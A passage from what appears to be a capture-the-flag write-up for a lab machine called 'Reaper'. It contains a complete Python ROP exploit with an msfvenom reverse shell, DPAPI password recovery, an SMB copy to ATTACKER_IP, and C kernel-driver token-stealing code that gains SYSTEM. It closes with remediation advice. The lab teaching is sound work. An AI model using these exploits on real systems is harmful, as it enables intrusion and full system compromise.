+<li>The trailing string is decoded from Base64 into a fixed-size local stack buffer.</li>
+<li><strong>Crucial Flaw</strong>: The base64 decoder does not enforce any maximum length check on the destination buffer!</li>
+</ul>
+<p>To confirm the overflow and identify the crash condition, we send a cyclic pattern in the base64 comment segment:</p>
+<pre><code class="language-bash">python3 -c &quot;
+from pwn import *
+prefix = b'100-FE9A1-500-A270-0102-'
+payload = prefix + cyclic(500)
+print('1')
+print(payload.decode())
+print('2')
+&quot; | nc 10.129.234.200 4141
+</code></pre>
+<p>The service crashes instantly upon processing Option 2.</p>
+<h4>Crash Analysis &amp; Offset Determination</h4>
+<ol>
+<li>Why must the payload be base64-encoded? Because raw binary exploitation payloads (ROP gadget addresses, pointers, and shellcode) inevitably contain null bytes (<code>0x00</code>). If transmitted as raw ASCII, string functions like <code>strlen()</code> and <code>strcpy()</code> terminate on the first null byte, truncating the payload. Base64 encoding completely sidesteps null-byte filtering.</li>
+<li>Using Metasploit's <code>pattern_offset.rb</code> on the crash dump registers reveals:
+<ul>
+<li><strong>Offset to Return Address (RIP)</strong>: Exactly <strong>88 bytes</strong>.</li>
+</ul>
+</li>
+</ol>
+<p>We now possess all required exploit primitives:</p>
+<ul>
+<li><strong>Primitive 1 (Format String Leak)</strong> → Defeats ASLR, calculates <code>pbase</code>.</li>
+<li><strong>Primitive 2 (Stack Buffer Overflow)</strong> → Overwrites RIP at offset 88 with full control of the execution flow.</li>
+</ul>
+<hr />
+<h2 id="foothold-shell-as-keysvc">Foothold - Shell as <code>keysvc</code></h2>
+<h3 id="attack-architecture-amp-mitigation-strategy">Attack Architecture &amp; Mitigation Strategy</h3>
+<p>With ASLR defeated and RIP control established, our primary obstacle is <strong>Data Execution Prevention (DEP/NX)</strong>. We cannot execute shellcode on the stack directly.</p>
+<h4>Why <code>VirtualAlloc</code> instead of <code>VirtualProtect</code>?</h4>
+<p>In standard Windows userland exploitation, researchers typically use a ROP chain to call <code>kernel32!VirtualProtect</code>:</p>
+<pre><code class="language-c">VirtualProtect(lpAddress, dwSize, PAGE_EXECUTE_READWRITE, &amp;oldProtect);
+</code></pre>
+<p>However, when we audit the Import Address Table (IAT) of <code>dev_keysvc.exe</code>, <code>VirtualProtect</code> is <strong>completely absent</strong>. It was never linked by the compiler!</p>
+<p>Looking closely at the IAT, we spot another memory management API: <code>kernel32!VirtualAlloc</code>, present at offset <code>0x20000</code> from the binary base:</p>
+<pre><code class="language-c">LPVOID VirtualAlloc(
+    LPVOID lpAddress,
+    SIZE_T dwSize,
+    DWORD  flAllocationType,
+    DWORD  flProtect
+);
+</code></pre>
+<p>Under Windows memory management semantics:</p>
+<ul>
+<li>If <code>lpAddress</code> points to an existing allocated stack region, and <code>flAllocationType</code> is set to <code>MEM_COMMIT</code> (<code>0x1000</code>), <code>VirtualAlloc</code> will re-commit the target memory page with the new protection flags specified in <code>flProtect</code>!</li>
+<li>Setting <code>flProtect = PAGE_EXECUTE_READWRITE</code> (<code>0x40</code>) flips the stack page containing our shellcode from non-executable (<code>RW-</code>) to executable (<code>RWX</code>).</li>
+</ul>
+<hr />
+<h3 id="windows-x64-calling-convention-amp-rop-gadget-assembly">Windows x64 Calling Convention &amp; ROP Gadget Assembly</h3>
+<p>The Microsoft x64 Application Binary Interface (ABI) dictates that function parameters are passed via registers:</p>
+<ul>
+<li><strong>1st argument (<code>lpAddress</code>)</strong> → <code>RCX</code> (must point to our stack memory, e.g., current <code>RSP</code>).</li>
+<li><strong>2nd argument (<code>dwSize</code>)</strong> → <code>RDX</code> (<code>0x1000</code>, 4096 bytes / one memory page).</li>
+<li><strong>3rd argument (<code>flAllocationType</code>)</strong> → <code>R8</code> (<code>0x1000</code>, <code>MEM_COMMIT</code>).</li>
+<li><strong>4th argument (<code>flProtect</code>)</strong> → <code>R9</code> (<code>0x40</code>, <code>PAGE_EXECUTE_READWRITE</code>).</li>
+</ul>
+<p>Because no single &quot;clean&quot; gadget exists for every register, we assemble creative gadget sequences from the binary:</p>
+<pre><code>VirtualAlloc(
+    lpAddress  = RSP (current stack, via RSP→RCX gadget chain),
+    dwSize     = 0x1000,
+    flType     = 0x1000  (MEM_COMMIT),
+    flProtect  = 0x40    (PAGE_EXECUTE_READWRITE)
+)
+→ push rsp; and al, 8; ret   (lands into NOP sled)
+→ \x90 * 8
+→ shellcode
+</code></pre>
+<h4>Detailed Gadget Breakdown:</h4>
+<ol>
+<li><strong>Setting <code>R8</code> (<code>0x1000</code>)</strong>:
+<ul>
+<li><code>mov r8, 0; add rsp, 8; ret</code> clears <code>r8</code>.</li>
+<li><code>pop rbx; ret</code> loads <code>0x1000</code> into <code>rbx</code>.</li>
+<li><code>mov r9, rbx; mov r8, 0; add rsp, 8; ret</code> and <code>add r8, r9; add rax, r8; ret</code> transfer the value into <code>r8</code>.</li>
+</ul>
+</li>
+<li><strong>Setting <code>R9</code> (<code>0x40</code>)</strong>:
+<ul>
+<li>Uses a conditional move gadget: <code>cmove r9, rdx; mov rax, r9; ret</code>.</li>
+<li>Satisfies the condition flag using <code>pop rsi</code>, loading <code>0x6348ffff</code>, and running <code>cmp esi, 0x6348ffff</code>.</li>
+</ul>
+</li>
+<li><strong>Setting <code>RDX</code> (<code>0x1000</code>)</strong>:
+<ul>
+<li>Uses <code>pop r13; ret</code> to load <code>0x1000</code>.</li>
+<li>Transfers to <code>RDX</code> via <code>mov rdx, r13; call rax</code> (with <code>rax</code> pointing to a benign <code>ret</code> gadget).</li>
+</ul>
+</li>
+<li><strong>Setting <code>RCX</code> (<code>RSP</code>)</strong>:
+<ul>
+<li>Dynamically captures the current stack pointer:
+<code>pop rbx; ret (0)</code> → <code>xor rbx, rsp; ret</code> → <code>push rbx; pop rax; ret</code> → <code>mov rcx, rax; ret</code>.</li>
+</ul>
+</li>
+<li><strong>Calling <code>VirtualAlloc</code> &amp; Pivoting</strong>:
+<ul>
+<li>Dereferences the IAT pointer via <code>jmp qword ptr [rbx]</code> with <code>rbx = pbase + 0x20000</code>.</li>
+<li>Returns to a stack-pivot gadget: <code>push rsp; and al, 8; ret</code>, which jumps directly into an 8-byte NOP sled preceding our reverse shell payload!</li>
+</ul>
+</li>
+</ol>
+<hr />
+<h3 id="complete-python-weaponization-exploit">Complete Python Weaponization Exploit</h3>
+<p>The complete exploit script chains all primitives into an automated, deterministic trigger:</p>
+<pre><code class="language-python"># vulnlab reaper exploit - macz 2023/08 (adapted)
+from pwn import *
+import base64
+import subprocess
+
+target_ip = &quot;10.129.234.200&quot;
+listener_ip = &quot;YOUR_TUN0_IP&quot;
+listener_port = 9001
+
+log.info(&quot;generating shellcode...&quot;)
+subprocess.check_output(
+    f&quot;msfvenom -p windows/x64/shell_reverse_tcp LHOST={listener_ip} LPORT={listener_port} -f python -v sc -o sc.py&quot;,
+    shell=True
+)
+from sc import *
+
+p = remote(target_ip, 4141)
+
+# --- Phase 1: FSB leak to defeat ASLR ---
+# &quot;Checking key: &quot; is at offset 0x20660 from binary base
+log.info(&quot;leaking program base...&quot;)
+p.sendlineafter(b&quot;Exit&quot;, b&quot;1&quot;)
+p.sendafter(b&quot;Enter a key:&quot;, b&quot;%pX-FE9A1-500-A270-0194-U3RhbmRhcmQgTGljZW5zZQ==&quot;)
+# checksum for &quot;%pX-FE9A1-500-A270&quot; = 194
+p.sendlineafter(b&quot;Exit&quot;, b&quot;2&quot;)
+p.readuntil(b&quot;Checking key: &quot;)
+leak = int(p.readuntil(b&quot;X&quot;, drop=True).decode(), 16)
+pbase = leak - 0x20660
+log.info(f&quot;leak:  {hex(leak)}&quot;)
+log.info(f&quot;pbase: {hex(pbase)}&quot;)
+
+# --- Phase 2: ROP gadgets (relative offsets from binary base) ---
+pop_rcx         = 0x00000000000031dc  # pop rcx; clc; ret
+pop_rax         = 0x000000000000150a  # pop rax; ret
+pop_r13         = 0x00000000000047b3  # pop r13; ret
+mov_rdx_r13     = 0x000000000000368f  # mov rdx, r13; call rax
+pop_rbx         = 0x00000000000020d9  # pop rbx; ret
+mov_r9_rbx      = 0x0000000000001f90  # mov r9, rbx; mov r8, 0; add rsp, 8; ret
+cmove_r9_rdx    = 0x000000000001f37d  # cmove r9, rdx; mov rax, r9; ret
+mov_r8_0        = 0x0000000000001f93  # mov r8, 0; add rsp, 8; ret
+add_r8_r9       = 0x0000000000003918  # add r8, r9; add rax, r8; ret
+pop_rsi         = 0x0000000000004116  # pop rsi; ret
+cmp_esi         = 0x0000000000012ddb  # cmp esi, 0x6348ffff; ret
+jmp_qw_rbx      = 0x000000000001ec79  # jmp qword ptr [rbx]
+pop_r12_rsi     = 0x000000000000a99a  # pop rsi; pop r12; ret
+
+VirtualAlloc = pbase + 0x20000  # IAT entry
+
+# Helper: load R8 with value
+def load_r8(value):
+    r  = p64(pbase + mov_r8_0)
+    r += p64(0xdeadbeefdeadbeef)  # junk for add rsp, 8
+    r += p64(pbase + pop_rbx)
+    r += p64(value)
+    r += p64(pbase + mov_r9_rbx)
+    r += p64(0xdeadbeefdeadbeef)
+    r += p64(pbase + add_r8_r9)
+    return r
+
+# Helper: load R9 with value
+def load_r9(value):
+    r  = p64(pbase + pop_rsi)
+    r += p64(0x6348ffff)          # make cmove condition true
+    r += p64(pbase + cmp_esi)
+    r += p64(pbase + pop_r13)
+    r += p64(value)
+    r += p64(pbase + pop_rax)
+    r += p64(pbase + pop_rax)
+    r += p64(pbase + mov_rdx_r13)
+    r += p64(pbase + cmove_r9_rdx)
+    return r
+
+# Helper: load RDX with value
+def load_rdx(value):
+    r  = p64(pbase + pop_r13)
+    r += p64(value)
+    r += p64(pbase + pop_rax)
+    r += p64(pbase + pop_rax)     # fix call() side effect in mov_rdx_r13
+    r += p64(pbase + mov_rdx_r13)
+    return r
+
+# Helper: RSP → RCX (lpAddress = current stack pointer)
+def rsp_to_rcx():
+    r  = p64(pbase + pop_rbx)
+    r += p64(0)
+    r += p64(pbase + 0x0000000000001fa0)  # xor rbx, rsp; ret
+    r += p64(pbase + 0x0000000000001fc2)  # push rbx; pop rax; ret
+    r += p64(pbase + 0x0000000000001f80)  # mov rcx, rax; ret
+    return r
+
+# Helper: jump through IAT entry
+def jmp_IAT(address):
+    r  = p64(pbase + pop_rbx)
+    r += p64(address)
+    r += p64(pbase + jmp_qw_rbx)
+    r += p64(pbase + pop_r12_rsi)  # clean up stack after call
+    r += p64(0xdeadbeefdeadbeef)
+    r += p64(0xdeadbeefdeadbeef)
+    return r
+
+# --- Phase 3: Build full ROP chain ---
+log.info(&quot;building rop chain...&quot;)
+rop  = b&quot;&quot;
+rop += load_r8(0x1000)     # flAllocationType = MEM_COMMIT
+rop += load_r9(0x40)       # flProtect = PAGE_EXECUTE_READWRITE
+rop += load_rdx(0x1000)    # dwSize = one page
+rop += rsp_to_rcx()        # lpAddress = current RSP
+rop += jmp_IAT(VirtualAlloc)
+rop += p64(pbase + 0x000000000001becd)  # push rsp; and al, 8; ret → land in shellcode
+rop += b&quot;\x90&quot; * 8         # NOP sled
+rop += sc                  # msfvenom reverse shell
+
+# --- Phase 4: Send payload ---
+# 88 bytes padding (cyclic) + ROP chain, base64-encoded
+log.info(&quot;sending payload...&quot;)
+p.sendlineafter(b&quot;Exit&quot;, b&quot;1&quot;)
+payload = b&quot;101-FE9A1-550-A271-0109-&quot; + base64.b64encode(cyclic(88) + rop)
+p.sendafter(b&quot;Enter a key:&quot;, payload)
+
+log.info(&quot;triggering exploit...&quot;)
+p.sendlineafter(b&quot;Exit&quot;, b&quot;2&quot;)
+p.interactive()
+</code></pre>
+<hr />
+<h3 id="executing-the-exploit-amp-catching-the-shell">Executing the Exploit &amp; Catching the Shell</h3>
+<p>We launch a netcat listener on our attack machine and fire <code>exploit.py</code>:</p>
+<pre><code class="language-bash"># Terminal 1 - listener
+rlwrap nc -lvnp 9001
+
+# Terminal 2 - exploit
+python3 exploit.py
+</code></pre>
+<p>The script connects, leaks the memory pointer, computes <code>pbase</code>, constructs the ROP chain, and transmits the base64-encoded buffer. Within 2 seconds, our listener catches a reverse shell:</p>
+<pre><code>C:\keysvc&gt; whoami
+reaper\keysvc
+</code></pre>
+<p>We navigate to the user profile and recover the User Flag:</p>
+<pre><code>C:\Users\keysvc\Desktop\user.txt
+</code></pre>
+<hr />
+<h2 id="lateral-movement-dpapi-credential-decryption">Lateral Movement - DPAPI Credential Decryption</h2>
+<h3 id="identifying-the-encrypted-automation-blob">Identifying the Encrypted Automation Blob</h3>
+<p>Operating within our initial shell, we survey the filesystem for credentials, configuration files, and saved artifacts:</p>
+<pre><code class="language-powershell">type C:\Users\keysvc\automation.txt
+# 01000000d08c9ddf0115d1118c7a00c04fc297eb...
+</code></pre>
+<p>Inspecting the hex characters reveals the signature of a <strong>Windows Data Protection API (DPAPI)</strong> blob:</p>
+<ul>
+<li>The byte stream begins with <code>01 00 00 00</code> (Version 1).</li>
+<li>Followed by the 16-byte DPAPI GUID: <code>d0 8c 9d df 15 01 11 d1 8c 7a 00 c0 4f c2 97 eb</code>.</li>
+</ul>
+<h4>How DPAPI Works Internally</h4>
+<p>DPAPI uses symmetric cryptography (AES-256 or Triple-DES) to encrypt sensitive user secrets. The symmetric key is derived from the user's <strong>Master Key</strong>, which is stored securely in <code>%APPDATA%\Microsoft\Protect\{SID}\</code> and sealed with a key derived from the user's login password.</p>
+<p>Crucially, <strong>any code executing within the security context of the user whose Master Key encrypted the blob can decrypt it automatically</strong> without providing a password! The OS seamlessly unprotects the data via <code>CryptUnprotectData()</code>.</p>
+<hr />
+<h3 id="in-session-decryption-via-net-reflection">In-Session Decryption via .NET Reflection</h3>
+<p>Using PowerShell reflection into the Windows <code>System.Runtime.InteropServices</code> namespace, we convert the encrypted string into a secure string, export its BSTR pointer, and marshal it back into plaintext:</p>
+<pre><code class="language-powershell">$DPAPI_blob = Get-Content C:\Users\keysvc\automation.txt | ConvertTo-SecureString
+$decrypted = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($DPAPI_blob)
+[System.Runtime.InteropServices.Marshal]::PtrToStringBSTR($decrypted)
+# CatWinterMist10
+</code></pre>
+<p>The plaintext password is recovered: <strong><code>CatWinterMist10</code></strong>.</p>
+<p>We have valid credentials for <code>reaper\keysvc</code>:</p>
+<pre><code>keysvc : CatWinterMist10
+</code></pre>
+<hr />
+<h3 id="establishing-graphical-access-via-rdp">Establishing Graphical Access via RDP</h3>
+<p>With valid plaintext credentials in hand, we establish a high-performance Remote Desktop session using <code>xfreerdp3</code> to facilitate file transfer and driver reverse engineering:</p>
+<pre><code class="language-bash">xfreerdp3 /u:keysvc /p:CatWinterMist10 /v:10.129.234.200 +clipboard /cert:ignore
+</code></pre>
+<p>The desktop renders cleanly, giving us full GUI access to test, compile, and execute local exploits.</p>
+<hr />
+<h2 id="privilege-escalation-kernel-exploitation-reaper-sys">Privilege Escalation - Kernel Exploitation (<code>reaper.sys</code>)</h2>
+<h3 id="auditing-installed-third-party-drivers">Auditing Installed Third-Party Drivers</h3>
+<p>To assess privilege escalation vectors to <code>SYSTEM</code>, we query all loaded kernel drivers on the machine using <code>driverquery /v</code>:</p>
+<pre><code class="language-powershell"># Confirm driver is loaded and running
+driverquery /v | findstr reaper
+# reaper  Kernel  Auto  Running  \??\C:\driver\reaper.sys
+</code></pre>
+<p>A custom third-party driver named <code>reaper</code> is actively running in kernel space, located at <code>C:\driver\reaper.sys</code>.</p>
+<hr />
+<h3 id="exfiltrating-reaper-sys-for-offline-analysis">Exfiltrating <code>reaper.sys</code> for Offline Analysis</h3>
+<p>To reverse-engineer the driver in Ghidra, we exfiltrate <code>reaper.sys</code> back to our attack machine. We spin up an Impacket SMB server on Kali and copy the driver over the network:</p>
+<pre><code class="language-bash"># Attacker machine
+sudo impacket-smbserver -smb2support share .
+</code></pre>
+<pre><code class="language-powershell"># Target (RDP session)
+copy-item C:\driver\reaper.sys \\ATTACKER_IP\share\
+</code></pre>
+<hr />
+<h3 id="static-reverse-engineering-of-reaper-sys">Static Reverse Engineering of <code>reaper.sys</code></h3>
+<p>We import <code>reaper.sys</code> into Ghidra. Because this is a 64-bit Windows Kernel Driver (<code>.sys</code>), we locate its entry point at <code>DriverEntry</code>:</p>
+<ol>
+<li><code>DriverEntry</code> creates the device object <code>\Device\reaper</code> and a symbolic link <code>\DosDevices\reaper</code>, allowing userland applications to obtain a handle via <code>CreateFile(&quot;\\\\.\\reaper&quot;, ...)</code>.</li>
+<li><code>DriverEntry</code> sets the <code>IRP_MJ_DEVICE_CONTROL</code> major function pointer at <code>DriverObject-&gt;MajorFunction[0x0e]</code> to <code>FUN_140001020</code>.</li>
+</ol>
+<p>Navigating to <code>FUN_140001020</code> reveals a dispatch routine processing three distinct I/O Control (IOCTL) codes:</p>
+<h4>IOCTL 1: <code>0x80002003</code> (Pool Allocation)</h4>
+<pre><code class="language-c">// Requires magic value 0x6a55cc9e
+// Allocates 0x20-byte pool, copies user struct into it:
+//   [0]  = magic
+//   [1]  = thread_id
+//   [2]  = priority
+//   [4]  = src_address  (QWORD)
+//   [6]  = dst_address  (QWORD)
+DAT_140003050 = ExAllocatePoolWithTag(0, 0x20, 0x70616552);
+</code></pre>
+<ul>
+<li>Validates a 32-bit magic value <code>0x6a55cc9e</code>.</li>
+<li>Calls <code>ExAllocatePoolWithTag(NonPagedPool, 0x20, 'paeR')</code> to allocate a 32-byte chunk in non-paged kernel pool memory.</li>
+<li>Copies a user-supplied structure into the allocated kernel buffer, storing the chunk pointer in global variable <code>DAT_140003050</code>.</li>
+</ul>
+<h4>IOCTL 2: <code>0x80002007</code> (Pool Free)</h4>
+<pre><code class="language-c">ExFreePoolWithTag(DAT_140003050, 0x70616552);
+</code></pre>
+<ul>
+<li>Releases the allocated kernel pool memory via <code>ExFreePoolWithTag</code>.</li>
+</ul>
+<h4>IOCTL 3: <code>0x8000200b</code> (The Vulnerability - Arbitrary Kernel Copy)</h4>
+<pre><code class="language-c">// Arbitrary 8-byte kernel write - NO validation
+**(undefined8 **)(DAT_140003050 + 6) = **(undefined8 **)(DAT_140003050 + 4);
+// i.e.: *(dst_address) = *(src_address)
+</code></pre>
+<h4>Root-Cause Vulnerability Analysis</h4>
+<p>The implementation of IOCTL <code>0x8000200b</code> contains a catastrophic design vulnerability:</p>
+<ul>
+<li>It extracts <code>src_address</code> (from offset <code>+4</code> of the pool structure) and <code>dst_address</code> (from offset <code>+6</code>).</li>
+<li>It dereferences both pointers and copies an 8-byte Quadword (<code>QWORD</code>) from <code>*src_address</code> to <code>*dst_address</code>.</li>
+<li><strong>Zero Memory Validation</strong>: The driver performs no pointer validation whatsoever. It does not call <code>ProbeForRead()</code> or <code>ProbeForWrite()</code>, nor does it verify whether the pointers reside in User Mode (<code>0x0000000000000000</code> - <code>0x00007FFFFFFFFFFF</code>) or Kernel Mode (<code>0xFFFF800000000000</code> - <code>0xFFFFFFFFFFFFFFFF</code>).</li>
+</ul>
+<p>This primitive gives an unprivileged userland process a full <strong>arbitrary kernel read/write capability</strong>:</p>
+<ul>
+<li><strong>Arbitrary Kernel Read</strong>: Point <code>src_address</code> to any kernel address and <code>dst_address</code> to a userland buffer in our process. The driver reads kernel memory and writes it to our userland buffer.</li>
+<li><strong>Arbitrary Kernel Write</strong>: Point <code>src_address</code> to a userland buffer containing our desired value and <code>dst_address</code> to any target kernel memory address. The driver overwrites the kernel address with our data.</li>
+</ul>
+<hr />
+<h3 id="privilege-escalation-strategy-kernel-token-stealing">Privilege Escalation Strategy - Kernel Token Stealing</h3>
+<p>In modern Windows 10 (Build 19045), Supervisor Mode Execution Prevention (SMEP) prevents the CPU from executing instructions in user-mode pages while in Ring-0. Attempting to hijack control flow directly to execute shellcode in userland will trigger an immediate kernel BugCheck (<code>KERNEL_SECURITY_CHECK_FAILURE</code> or <code>PAGE_FAULT_IN_NONPAGED_AREA</code>).</p>
+<p>Therefore, the cleanest and most reliable technique is <strong>Direct Kernel Object Manipulation (DKOM) Token Stealing</strong>:</p>
+<ol>
+<li>Every process running in Windows is represented in kernel memory by an <code>_EPROCESS</code> structure.</li>
+<li>Inside <code>_EPROCESS</code> is a pointer to the process's <code>Token</code> object, which defines its security context and privileges.</li>
+<li>If we replace our process's <code>Token</code> pointer with the <code>Token</code> pointer belonging to the <code>System</code> process (<code>PID 4</code>), our userland process immediately acquires the security rights of <code>NT AUTHORITY\SYSTEM</code>!</li>
+</ol>
+<h4>Kernel Structure Offsets (Windows 10 Build 19045 x64):</h4>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Offset</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>UniqueProcessId</code></td>
+<td><code>0x440</code></td>
+<td>Process ID (PID)</td>
+</tr>
+<tr>
+<td><code>ActiveProcessLinks</code></td>
+<td><code>0x448</code></td>
+<td>Circular doubly-linked list (<code>LIST_ENTRY</code>) of all active processes</td>
+</tr>
+<tr>
+<td><code>Token</code></td>
+<td><code>0x4b8</code></td>
+<td><code>EX_FAST_REF</code> pointer to the Process Token</td>
+</tr>
+</tbody>
+</table>
+<h4>Exploitation Workflow:</h4>
+<ol>
+<li>Obtain the kernel address of the <code>System _EPROCESS</code> structure using <code>NtQuerySystemInformation(SystemHandleInformation)</code>.</li>
+<li>Use our <code>arbRead()</code> primitive to traverse the <code>ActiveProcessLinks</code> linked list starting from the <code>System</code> process.</li>
+<li>Inspect <code>UniqueProcessId</code> (<code>+0x440</code>) at each node until we locate our own process PID.</li>
+<li>Read the 8-byte <code>Token</code> pointer (<code>+0x4b8</code>) from the <code>System</code> process (PID 4).</li>
+<li>Use our <code>arbWrite()</code> primitive to overwrite our process's <code>Token</code> pointer (<code>+0x4b8</code>) with the <code>System</code> token.</li>
+<li>Spawn a new command prompt (<code>cmd.exe</code>). Because child processes inherit the security token of their parent, the resulting shell runs as <code>NT AUTHORITY\SYSTEM</code>!</li>
+</ol>
+<hr />
+<h3 id="developing-the-c-exploit-harness-priv-c">Developing the C Exploit Harness (<code>priv.c</code>)</h3>
+<p>We write a dedicated C exploit implementing the IOCTL communication and token-stealing logic:</p>
+<pre><code class="language-c">// Arbitrary read: dereference kernel pointer via IOCTL chain
+QWORD arbRead(QWORD where) {
+    reap ioctl;
+    QWORD output;
+    ioctl.magic       = 0x6A55CC9E;
+    ioctl.thread_id   = GetCurrentThreadId();
+    ioctl.priority    = 0;
+    ioctl.src_address = where;
+    ioctl.dst_address = (QWORD)&amp;output;  // write result to our userland buffer
+    Allocate(hFile, &amp;ioctl);
+    Copy(hFile);   // *(dst) = *(src) - reads kernel memory into output
+    Free(hFile);
+    return output;
+}
+
+// Arbitrary write: write 8 bytes to kernel address
+void arbWrite(QWORD dst, QWORD src) {
+    reap ioctl;
+    ioctl.magic       = 0x6A55CC9E;
+    ioctl.thread_id   = GetCurrentThreadId();
+    ioctl.priority    = 0;
+    ioctl.src_address = src;   // pointer to our value
+    ioctl.dst_address = dst;   // kernel address to overwrite
+    Allocate(hFile, &amp;ioctl);
+    Copy(hFile);
+    Free(hFile);
+}
+
+// In main():
+eProcResult result    = GetEProcessByPid(GetCurrentProcessId());
+eProcResult sysresult = GetEProcessByPid(4);  // SYSTEM = PID 4
+
+// Overwrite our token with SYSTEM's token
+arbWrite(result.eProcess + 0x4b8, sysresult.eProcess + 0x4b8);
+system(&quot;cmd.exe&quot;);  // spawns as NT AUTHORITY\SYSTEM
+</code></pre>
+<hr />
+<h3 id="compilation-amp-exploitation-execution">Compilation &amp; Exploitation Execution</h3>
+<p>We compile <code>priv.c</code> using the 64-bit MinGW cross-compiler:</p>
+<pre><code class="language-bash">x86_64-w64-mingw32-gcc -o exploit.exe priv.c -lpsapi
+</code></pre>
+<p>We transfer <code>exploit.exe</code> to <code>C:\Users\keysvc\Desktop\</code> via our existing SMB share and execute it inside our RDP session:</p>
+<pre><code>C:\Users\keysvc\Desktop\exploit.exe
+
+[+] Getting Device Driver Handle
+[+] Device Handle: 0x00000000000000b8
+[&gt;] System _EPROCESS: 0xffff9c0d4dc92080
+[&gt;] Found Process: ffff9c0d54bd5080 (PID: 5556, TOKEN_PTR: ffffb0092fa9d064)
+[&gt;] Found Process: ffff9c0d4dc92080 (PID: 4,    TOKEN_PTR: ffffb0092920f045)
+[+] Copying SYSTEM token to current process...
+[+] Spawning SYSTEM shell...
+
+C:\Users\keysvc&gt; whoami
+nt authority\system
+</code></pre>
+<p>The exploit executes cleanly, swaps the token, and spawns an interactive shell running as <strong><code>nt authority\system</code></strong>.</p>
+<p>We navigate to the Administrator's desktop and capture the Root Flag:</p>
+<pre><code>C:\Users\Administrator\Desktop\root.txt
+</code></pre>
+<hr />
+<h2 id="defensive-engineering-amp-remediation-blueprint">Defensive Engineering &amp; Remediation Blueprint</h2>
+<p>To prevent similar multi-stage compromise chains in enterprise environments, developers and systems administrators should implement the following remediations:</p>
+<ol>
+<li>
+<p><strong>Eliminate Format String Flaws (CWE-134)</strong>:</p>
+<ul>
+<li>Always supply a static format specifier string to formatting functions:<pre><code class="language-c">// VULNERABLE:
+_snprintf(buffer, sizeof(buffer), user_input);
+
+// SECURE:
+_snprintf(buffer, sizeof(buffer), &quot;%s&quot;, user_input);
+</code></pre>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Enforce Boundary Checks on Decoders (CWE-121)</strong>:</p>
+<ul>
+<li>When decoding data from formats such as Base64, hex, or URL-encoding, calculate the maximum possible output length and ensure it does not exceed the destination buffer size before writing.</li>
+</ul>
+</li>
+<li>
+<p><strong>Compiler Mitigations (CFG &amp; ASLR High Entropy)</strong>:</p>
+<ul>
+<li>Compile all C/C++ services with <code>/guard:cf</code> (Control Flow Guard) and <code>/HIGHENTROPYVA</code> (64-bit ASLR with high entropy) to restrict ROP gadget execution.</li>
+</ul>
+</li>
+<li>
+<p><strong>Kernel Driver Pointer Validation &amp; Access Control (CWE-129 / CWE-787)</strong>:</p>
+<ul>
+<li>Kernel drivers must validate all user-mode pointer arguments using <code>ProbeForRead()</code> and <code>ProbeForWrite()</code> within <code>__try / __except</code> structured exception handling blocks.</li>
+<li>Restrict access to device objects using <code>IoCreateDeviceSecure()</code> so that unprivileged users cannot open handles to administrative hardware drivers.</li>
+</ul>
+</li>
+<li>
+<p><strong>DPAPI Best Practices</strong>:</p>
+<ul>
+<li>Avoid storing unmanaged plaintext passwords in automated scripts. Leverage Windows Credential Manager or dedicated secret vaults (such as HashiCorp Vault or Azure Key Vault) with hardware-backed TPM sealing.</li>
+</ul>
+</li>
+</ol>
+<hr />
+<h2 id="credentials-summary">Credentials Summary</h2>
+<table>
+<thead>
+<tr>
+<th>Username</th>
+<th>Password</th>
+<th>Method</th>
+<th>Scope / Access</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>keysvc</code></td>
+<td><em>(shell via BOF+ROP)</em></td>
+<td>Format string leak + 64-bit VirtualAlloc ROP</td>
+<td>Reverse shell on Port 9001</td>
+</tr>
+<tr>
+<td><code>keysvc</code></td>
+<td><code>CatWinterMist10</code></td>
+<td>DPAPI blob decryption via .NET Reflection</td>
+<td>Interactive GUI access via RDP (Port 3389)</td>
+</tr>
+<tr>
+<td><code>SYSTEM</code></td>
+<td>-</td>
+<td>Kernel driver token stealing via <code>reaper.sys</code></td>
+<td>Full system compromise (<code>NT AUTHORITY\SYSTEM</code>)</td>
+</tr>
+</tbody>
+</table>
+
+        <div class="post-end-encrypt-bar" id="post-end-encrypt-bar">
+          <div class="post-end-encrypt-inner">
+            <div class="post-end-encrypt-meta">
+              <div class="post-end-encrypt-tag">
+                <svg class="ui-icon" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+                <span>// PRIVACY SHIELD // ZERO-KNOWLEDGE LOCK</span>
+              </div>
+              <div class="post-end-encrypt-title">Finished reading or stepping away?</div>
+              <p class="post-end-encrypt-desc">Conceal this advisory and lock the viewport in-browser using WebCrypto AES-256-GCM.</p>
+            </div>
+            <div class="post-end-encrypt-action">
+              <button type="button" id="btn-end-encrypt" class="btn-end-encrypt" onclick="window.togglePrivacyLock()">
+                <svg class="ui-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+                <span>ENCRYPT &amp; LOCK POST</span>
+              </button>
+            </div>
+          </div>
+        </div>
+
+        </div>
+      </article>
+
+      <aside class="post-toc-sidebar" id="post-toc-sidebar">
+        <div class="toc-title">
+          <div class="toc-title-left"><span>//</span> ON THIS PAGE</div>
+          <span class="toc-status-pulse"></span>
+        </div>
+        <ul class="toc-nav" id="toc-nav">
+<li class="toc-h2"><a href="#introduction" class="toc-link" data-slug="introduction">Introduction</a></li><li class="toc-h2"><a href="#attack-narrative-amp-architecture" class="toc-link" data-slug="attack-narrative-amp-architecture">Attack Narrative &amp;amp; Architecture</a></li><li class="toc-h3"><a href="#key-technical-takeaways" class="toc-link" data-slug="key-technical-takeaways">Key Technical Takeaways:</a></li><li class="toc-h2"><a href="#enumeration" class="toc-link" data-slug="enumeration">Enumeration</a></li><li class="toc-h3"><a href="#port-scanning-amp-network-topology-mapping" class="toc-link" data-slug="port-scanning-amp-network-topology-mapping">Port Scanning &amp;amp; Network Topology Mapping</a></li><li class="toc-h3"><a href="#ftp-reconnaissance-amp-binary-exfiltration" class="toc-link" data-slug="ftp-reconnaissance-amp-binary-exfiltration">FTP Reconnaissance &amp;amp; Binary Exfiltration</a></li><li class="toc-h3"><a href="#analyzing-dev-keys-txt" class="toc-link" data-slug="analyzing-dev-keys-txt">Analyzing 